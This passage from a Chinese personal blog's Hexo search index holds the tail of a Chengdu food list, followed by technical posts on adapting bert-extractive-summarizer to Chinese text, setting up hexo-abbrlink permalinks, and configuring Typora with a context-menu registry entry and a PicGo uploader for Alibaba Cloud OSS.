title="建设北路"></a>建设北路</h2><ul><li><p>烤苕皮</p></li><li><p>油条糯米糍（不叫这个，具体叫啥忘了）：个人觉得非常好吃，每次去都买一个肉松味的。</p></li><li><p>冰粉：必吃，一般吃火锅点一个。</p></li><li><p>冰豆花</p></li><li><p>蛋烘糕</p></li><li><p>成都市很好吃的火锅粉：很多人说超好吃，但我还没去吃过。推荐脑花、火锅粉。</p></li><li><p>钵钵鸡</p></li><li><p>担担面</p></li></ul><h2 id="宽菜日记"><a href="#宽菜日记" class="headerlink" title="宽菜日记"></a>宽菜日记</h2><ul><li>推荐菜：<ul><li>甜皮鸭：都说很好吃，还没吃过，有机会尝试下。建议买来后1-2小时内吃，放久了就不好吃了。</li></ul></li></ul><h2 id="蹄花"><a href="#蹄花" class="headerlink" title="蹄花"></a>蹄花</h2><ul><li><p>吴氏蹄花：川大望江校区附近，学长学姐祖传的老店，个人觉得比较便宜而且好吃，推荐雪豆蹄花汤，可以顺便点一个他们的铁板烧，很好吃。</p></li><li><p>无名蹄花：大众点评必吃榜上的，没吃过</p></li></ul><h1 id="不推荐"><a href="#不推荐" class="headerlink" title="不推荐"></a>不推荐</h1><h2 id="陶德砂锅"><a href="#陶德砂锅" class="headerlink" title="陶德砂锅"></a>陶德砂锅</h2><p>网红店。很一般，本地人都不推荐的店</p><h2 id="烤匠"><a href="#烤匠" class="headerlink" title="烤匠"></a>烤匠</h2><p>本人去过好几次，感觉也是比较一般，而且偏贵，推荐菜：芝士烤红薯</p><h2 id="冒椒火辣"><a href="#冒椒火辣" class="headerlink" title="冒椒火辣"></a>冒椒火辣</h2><p>网红店。小菜很好吃（脑花好吃），但是串串感觉味道很一般，偏贵</p><h2 id="饕林餐厅"><a href="#饕林餐厅" class="headerlink" title="饕林餐厅"></a>饕林餐厅</h2><p>网红店。个人觉得很一般，而且偏贵。-</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『工程记录』修改bert-extractive-summarizer项目用于中文文本摘要任务</title>
      <link href="/posts/fbe6.html"/>
      <url>/posts/fbe6.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>本文为bert-extractive-summarizer项目改中文模型记录</p><ul><li><p>主页文档：<a href="https://pypi.org/project/bert-extractive-summarizer/">https://pypi.org/project/bert-extractive-summarizer/</a></p></li><li><p>github项目地址：<a href="https://github.com/dmmiller612/bert-extractive-summarizer">https://github.com/dmmiller612/bert-extractive-summarizer</a></p></li></ul><p>该模型的原理在于：通过bert生成句子嵌入，对句子嵌入做聚类，找到最接近聚类质心的句子，同时使用<a href="https://github.com/huggingface/neuralcoref">neuralcoref</a>库实现共指消解功能（比较符合目前的业务，项目数据集中的政治新闻大多系外媒台媒文章，不像国内的文章那样规范，行文比较随意，同时因为外文翻译为中文存在一些语句翻译质量低，所以存在很多的指代问题）</p><p>发现原始模型做的是英文的摘要生成，要进行中文摘要需要将其修改成中文的Bert模型和分词器，参考作者给出的<a href="https://geek.digiasset.org/pages/nlp/nlpinfo/bert-text-summarizer-chinese/">中文模型文档</a>和github下的<a href="https://github.com/dmmiller612/bert-extractive-summarizer/issues/45">issue</a>完成了中文摘要的提取。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="spacy-neuralcoref-搭建共指消解环境"><a href="#spacy-neuralcoref-搭建共指消解环境" class="headerlink" title="spacy + neuralcoref 搭建共指消解环境"></a>spacy + neuralcoref 搭建共指消解环境</h2><p>指代消解任务通过<code>spacy + uralcoref</code>实现。spacy是一个NLP领域的文本预处理Python库，包括分词、词性标注、依存分析等多个nlp基础任务的实现，neuralcoref相当于一个插件，在spacy框架下实现指代消解。</p><p>我在初次安装过程中<strong>出现了Spacy和neuralcoref的版本适配问题</strong>，安装很多版本都不能顺利运行，各种error。最终找到一个匹配的安装方式，按照下面的流程来进行安装的话应该不会出现兼容性的问题。</p><p>如果你是<strong>英文任务</strong>的话，推荐：<strong>spacy 2.1.0 + neuralcoref 4.0 + en_core_web_sm-2.1.0</strong></p><blockquote><p>但是这一套对中文模型版本并不适用， neuralcoref并不支持中文共指消解。所以对中文任务而言，如果要使用这里的共指消解，需要使用其他的支持中文的共指消解工具。</p><p>因此<strong>我们后面的中文摘要生成部分并没有使用共指消解，后续有机会可以尝试加上</strong></p></blockquote><p>我们先pip install spacy&#x3D;&#x3D;2.1.0，前面提到neuralcoref相当于spaCy的一个插件，所以先安装neuralcoref会自动帮我们安装 spacy，可能会产生版本冲突。</p><p>接下来安装spacy 2.1.0版本库上的 transformer-based pipelines 的预训练模型 en_core_web_sm-2.1.0，<strong>注意这里的版本一定要和前面的spacy一样</strong>，产生报错建议手动安装 </p><p>安装完spacy后安装neuralcoref，<strong>建议这里去pypi上找到对应的 <a href="https://pypi.org/project/neuralcoref/#files">neuralcoref包</a> 下载到本地后手动安装</strong>，不然可能会产生下面的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215165152653.png" alt="image-20231215165152653"></p><h2 id="搭建-bert-extractive-summarizer-环境"><a href="#搭建-bert-extractive-summarizer-环境" class="headerlink" title="搭建 bert-extractive-summarizer 环境"></a>搭建 bert-extractive-summarizer 环境</h2><p>首先从github上clone该项目</p><p>然后运行一个小demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;This repo is the generalization of the lecture-summarizer repo. This tool utilizes the HuggingFace Pytorch transformers library to run extractive summarizations. This works by first embedding the sentences, then running a clustering algorithm, finding the sentences that are closest to the cluster&#x27;s centroids. This library also uses coreference techniques, utilizing the https://github.com/huggingface/neuralcoref library to resolve words in summaries that need more context. The greedyness of the neuralcoref library can be tweaked in the CoreferenceHandler class.As of the most recent version of bert-extractive-summarizer, by default, CUDA is used if a gpu is available.&quot;</span></span><br><span class="line">model = Summarizer()</span><br><span class="line">result = model(body, num_sentences=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>下载好相应的依赖后发现出现报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218101532243.png" alt="image-20231218101532243"></p><p>这里的报错原因在于：代码试图从Hugging Face模型存储库（<a href="https://huggingface.co)下载模型文件,但由于网站不稳定等原因无法连接到该服务器./">https://huggingface.co）下载模型文件，但由于网站不稳定等原因无法连接到该服务器。</a></p><blockquote><p>在使用Hugging Face Transformers库时（很多需要用到某些模型的机器学习库都是这样），如果你指定的模型没有在本地缓存中找到，库会尝试从Hugging Face模型存储库下载所需的模型文件，以便进行后续的模型初始化和使用。这是因为模型文件通常比较大，不方便直接包含在库中，因此在需要时会动态下载。</p></blockquote><p>因此这里我们选择手动下载模型</p><h2 id="手动下载中文模型"><a href="#手动下载中文模型" class="headerlink" title="手动下载中文模型"></a>手动下载中文模型</h2><p>Hugging Face Transformers库所使用的默认bert模型 bert-large-uncased 只可以用于英文语料，如果我们要将该项目应用在中文的摘要任务上需要稍作修改，使用一个中文的bert模型和一个中文的分词器。</p><p>首先我们<strong>手动下载中文的bert模型 bert-base-chinese</strong> </p><p>打开Hugging Face的官网搜索我们想要的模型<a href="https://huggingface.co/bert-base-chinese">bert-base-chinese</a>，点击files，下载下面红框内的四个文件，然后根据你使用的框架选择相应的模型文件，如果使用的是pytorch就下载pytorch_model.bin，如果是TensorFlow就换成tf_model.h5，这里我们使用的是pytorch，所以选择pytorch_model.bin进行下载。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218103610166.png" alt="image-20231218103610166"></p><p>将下载好的文件放在我们的项目目录下，比如我这里建立了一个bert-base-chinese文件夹存放：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218104219354.png" alt="image-20231218104219354"></p><p>接下来将需要用到该模型的地方修改为我们本地的路径就可以了</p><h1 id="修改源代码"><a href="#修改源代码" class="headerlink" title="修改源代码"></a>修改源代码</h1><p>spacy默认使用英文分词，我们需要将其改成中文。</p><p>将 <code>bert-extractive-summarizer/summarizer/sentence_handler.py</code> 下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.en <span class="keyword">import</span> English </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=English</span>):</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.zh <span class="keyword">import</span> Chinese</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=Chinese</span>):</span><br></pre></td></tr></table></figure><h1 id="测试模型"><a href="#测试模型" class="headerlink" title="测试模型"></a>测试模型</h1><p>在主目录下创建test.py测试模型，在这里我们使用的是自己手动下载的模型，使用<code>AutoConfig</code>、<code>AutoTokenizer</code>和<code>AutoModel</code>来加载bert-base-chinese&#x2F;目录下的模型和相关配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load model, model config and tokenizer via Transformers</span></span><br><span class="line">custom_config = AutoConfig.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_config.output_hidden_states=<span class="literal">True</span></span><br><span class="line">custom_tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_model = AutoModel.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>, config=custom_config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">body = <span class="string">&#x27;准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。灰色西装外套配上细框眼镜，高雄市副市长史哲，出席海事展剪彩活动，作为高雄近年艺文展演重要推手的他，如今传出可能接任文化部长，立委(民)赵天麟说：「史哲副市长有非常丰富的行政经历，在陈菊市长时代就被称为点子王，在陈其迈市长的时代里面，他更是把亚洲新湾区，变成了是一个国际非常知名的亮点，我相信可以把，这么成功的高雄经验南方经验，成为未来的台湾之光。」盘点史哲过去艺文经历，不但曾担任过高雄的新闻处长，文化局长等等，也曾操刀陈水扁的竞选广告，2009年世运会开幕典礼，筹画设计的三太子骑机车，一举让台湾跃上国际舞台，另外催生驳二和高雄总图，以及推出高雄春天艺术节，重办大港开唱等等，也都出自史哲之手，源源不绝的创意经验，堪称超级点子王。立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」虽然史哲并没证实即将入阁，不过原文化部长李永得，已经要转任政委，而目前文化部仍有公视法修法，和中正纪念堂转型两大关键政策，预计要在今年推动，究竟最终，是不是由史哲继续接手，未来文化部长的执行力，将成为检验内阁改组的重要指标。新闻来源：华视新闻&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = Summarizer(custom_model=custom_model, custom_tokenizer=custom_tokenizer)</span><br><span class="line"><span class="built_in">print</span>(model(body, num_sentences=<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。 被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。 立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://blog.csdn.net/du_lun/article/details/129462104">https://blog.csdn.net/du_lun/article/details/129462104</a></li><li><a href="https://blog.csdn.net/m0_46295727/article/details/133221439">https://blog.csdn.net/m0_46295727/article/details/133221439</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『SEO优化』：Hexo-abbrlink插件生成hexo永久固定链接</title>
      <link href="/posts/1e78.html"/>
      <url>/posts/1e78.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo默认url格式存在的问题"><a href="#hexo默认url格式存在的问题" class="headerlink" title="hexo默认url格式存在的问题"></a>hexo默认url格式存在的问题</h1><p>Hexo在生成博客文章链接时，默认的静态URL格式是 <code>:year/:month/:day/:title</code>，也就是按照年、月、日、标题格式来生成固定链接的，如<code>http://xxx.yy.com/2020/07/06/hello-world</code>。</p><p><strong>这样的话就会存在一些问题：</strong></p><ul><li><p>如果你的标题是中文的话，你的URL链接就会包含中文，例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204194948770.png" alt="image-20231204194948770"></p><p>这样的url路径复制后会将中文变成一大堆字符串编码：<a href="https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/">https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/</a> </p><p>如果你在其它地方用了你自己这篇文章的url链接，偶然你又修改了该文章的标题，那<strong>这个url链接就会失效</strong>。</p></li><li><p>这样的url格式中年月日都会有分隔符，生成的链接会成为一个四级目录，<strong>对于搜索引擎来说并不是很友好。</strong></p><blockquote><p>百度蜘蛛在抓取网页时遵循以下规则：</p><p>网页的抓取频率与其权重和信用度成正比，尤其是对网站的首页和内页。通常，蜘蛛首先抓取网站的首页，因为首页通常具有更高的权重，而且大多数链接都指向首页。然后，通过首页抓取网站的内页，但并非所有内页都会被蜘蛛抓取。</p><p>搜索引擎认为对于一般的中小型站点，3层结构足以包含所有内容，因此蜘蛛主要抓取前三层的内容。超过三层的内容被认为相对不重要，因此蜘蛛不会经常爬取这些内容。因此，在设计链接结构时，最好将permalink后面的层级控制在2个斜杠以内。</p></blockquote></li></ul><h1 id="hexo-abbrlink的安装配置"><a href="#hexo-abbrlink的安装配置" class="headerlink" title="hexo-abbrlink的安装配置"></a><strong>hexo-abbrlink的安装配置</strong></h1><p>为了解决上面提到的问题，我们使用Hexo的插件<strong>hexo-abbrlink</strong>，它能将 Hexo 生成的永久链接转化为一个固定的随机值，极大的缩短了永久链接的长度。一旦生成一个随机值，之后对文章的标题或者时间进行任何修改，这个随机的 abbrlink 是不会发生任何变化的，也为 Hexo 的维护提供了便利。</p><p>博客目录下执行命令安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$npm install hexo-abbrlink --save </span><br></pre></td></tr></table></figure><p>修改<code>_config.yml</code>文件中的配置项（记得把原来的<code>permalink:</code>删除掉）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置永久链接</span><br><span class="line">permalink: posts/:abbrlink.html  </span><br><span class="line">abbrlink:</span><br><span class="line">    alg: crc16   #算法： crc16(default) and crc32</span><br><span class="line">    rep: dec     #进制： dec(default) and hex</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><blockquote><p>参考文章<a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></p><p>在生成之前就要改好算法和形式。不然后面再改的话会导致链接不统一。我就踩过坑，但后来是一个文章一个文章删除<code>abbrlink:</code>的值才改过来的，还好我文章不是很多。</p><p>话说最近看到了Hexo-abbrlink2这个插件，可以从1.html开始编。</p><p>我试用了一下，会导致文章重复，正在研究如何解决。如果能从1开始编写的话，这样更容易看得出写了多少篇文章，当前上传和修改的是哪一篇。后面再研究。</p><p>PS：刚使用这个插件后，阅读人数和评论都会变为0，介意慎用！综上所述，这插件适合新站！</p></blockquote><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>侵权删：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/112318081">https://zhuanlan.zhihu.com/p/112318081</a></li><li><a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></li><li><a href="https://cloud.tencent.com/developer/article/1936315">https://cloud.tencent.com/developer/article/1936315</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『typora』相关配置与体验优化</title>
      <link href="/posts/c91a.html"/>
      <url>/posts/c91a.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍typora配置过程中的一些<strong>问题的解决方法</strong>以及<strong>优化体验方案</strong>。</p><h1 id="版本过期报错"><a href="#版本过期报错" class="headerlink" title="版本过期报错"></a>版本过期报错</h1><p>下载完成后如果出现版本过期的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204191844101.png" alt="image-20231204191844101"></p><p>具体解决方法参考：<a href="https://blog.csdn.net/wagnteng/article/details/126585618">https://blog.csdn.net/wagnteng/article/details/126585618</a></p><h1 id="设置右键菜单新建md"><a href="#设置右键菜单新建md" class="headerlink" title="设置右键菜单新建md"></a>设置右键菜单新建md</h1><p>任意位置创建一个txt文件，后缀改为reg</p><p>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md]</span><br><span class="line">@=&quot;Typora.md&quot;</span><br><span class="line">&quot;Content Type&quot;=&quot;text/markdown&quot;</span><br><span class="line">&quot;PerceivedType&quot;=&quot;text&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>完成后运行，运行完成后可以删除掉该文件</p><h1 id="图床配置：阿里云-PicGo-Core-command-line"><a href="#图床配置：阿里云-PicGo-Core-command-line" class="headerlink" title="图床配置：阿里云 + PicGo Core (command line)"></a>图床配置：阿里云 + PicGo Core (command line)</h1><p>Typora是一个跨平台的markdown编辑器，使用markdown编辑器写文章优点是排版简洁，痛点则是无法像Word那样直接嵌入图片，插入的图片实际上插入的是图片的路径（可以是本地路径也可以是网络路径），默认情况下为本地路径，这种情况下的md文档在别的终端上打开会无法查看图片。</p><p><strong>我们可以自己配置图床构建网络路径，来实现md文档的跨平台跨设备浏览</strong></p><p>下面介绍这里采用阿里云 + PicGo Core (command line)的方法来对图床进行配置的方法：</p><p><strong>1. PicGo Core (command line)下载与配置</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716132921821.png" alt="image-20230716132921821"></p><p>下载完成后打开找到文件夹 <code>C:\Users\用户名\AppData\Roaming\Typora\picgo\win64\</code> ，在对应文件夹下cmd执行 <code>./.config/Typora/picgo/linux/picgo install gitee-uploader</code>，若执行失败需要去安装nodejs环境</p><blockquote><p>nodejs安装教程：<a href="https://blog.csdn.net/zimeng303/article/details/112167688">https://blog.csdn.net/zimeng303/article/details/112167688</a></p></blockquote><p>完成后打开配置文件</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/348e3092fc111d18984bd35b197a3357.png" alt="image-20200620214326041"></p><p>文件内容修改如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;isodatop&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储空间名</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oss-cn-beijing&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储区域代号</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义存储路径</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://isodatop.oss-cn-beijing.aliyuncs.com&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义域名，注意要加 http://或者 https://</span></span><br><span class="line">      <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> <span class="comment">// 针对图片的一些后缀处理参数 PicGo 2.2.0+ PicGo-Core 1.4.0+</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>accesskeyid与secret的获取：</strong></p><p>登录阿里云，进入控制台，可以在里面查看这两个字段</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170158751.png" alt="image-20230716170158751"></p></li><li><p><strong>bucket、area、customUrl的获取</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170626283.png" alt="image-20230716170626283"></p><p>再点击进入bucket，bucket名称即为isodatop</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170714631.png" alt="image-20230716170714631"></p><p>点击概览</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170833593.png" alt="image-20230716170833593"></p><p>这里的②为<code>oss-cn-beijing.aliyuncs.com</code>，注意要去掉后面的<code>.aliyuncs.com</code>，将<code>oss-cn-beijing</code>填入area字段</p><p>③为<code>isodatop.oss-cn-beijing.aliyuncs.com</code>，添加上<code>https://</code>后填入 customUrl 字段</p><p><strong>2. 测试</strong></p><p>配置完成后打开typora的偏好设置，验证上传服务是否配置成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171455885.png" alt="image-20230716171455885"></p><p>出现如下界面则上传成功：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171616617.png" alt="image-20230716171616617"></p><blockquote><p><strong>如果出现报错或者上传成功但是图片在typora里面不予显示的情况</strong>：</p><p>注意检查前面几个字段是否按照要求进行了删除与添加相应的字段</p></blockquote></li></ul><h1 id="优化体验设置"><a href="#优化体验设置" class="headerlink" title="优化体验设置"></a>优化体验设置</h1><ul><li>文本高亮：<a href="https://blog.csdn.net/weixin_40626630/article/details/111405928">https://blog.csdn.net/weixin_40626630/article/details/111405928</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
